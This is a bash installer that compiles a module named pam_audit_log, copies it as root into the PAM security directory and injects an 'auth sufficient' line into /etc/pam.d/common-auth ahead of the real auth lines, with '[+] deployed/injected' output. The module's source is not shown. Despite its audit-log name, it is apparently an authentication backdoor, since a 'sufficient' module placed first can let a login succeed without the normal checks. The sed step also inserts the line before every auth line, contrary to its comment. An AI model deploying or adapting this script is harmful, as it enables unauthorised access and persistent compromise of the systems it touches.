#!/usr/bin/env bash
set -e

MODNAME="pam_audit_log"
SRC="$(dirname "$0")/${MODNAME}.c"
PAM_DIR=$(python3 -c "import ctypes.util, os; p=ctypes.util.find_library('pam'); print(os.path.join('/lib', os.path.basename(os.path.dirname(os.readlink('/lib/x86_64-linux-gnu/libpam.so.0'))), 'security'))" 2>/dev/null \
    || echo "/lib/x86_64-linux-gnu/security")
PAM_CONF="/etc/pam.d/common-auth"
INJECT_LINE="auth    sufficient    ${MODNAME}.so"

# compile
gcc -fPIC -shared -o "/tmp/${MODNAME}.so" "$SRC" -lpam 2>/dev/null
install -o root -g root -m 644 "/tmp/${MODNAME}.so" "${PAM_DIR}/${MODNAME}.so"
rm -f "/tmp/${MODNAME}.so"

# back up pam config once
[[ ! -f "${PAM_CONF}.orig" ]] && cp "$PAM_CONF" "${PAM_CONF}.orig"

# prepend our line if not already there
if ! grep -q "$MODNAME" "$PAM_CONF"; then
    # insert after the first comment block, before the first real auth line
    sed -i "/^auth/i ${INJECT_LINE}" "$PAM_CONF"
fi

echo "[+] deployed to ${PAM_DIR}/${MODNAME}.so"
echo "[+] injected into ${PAM_CONF}"
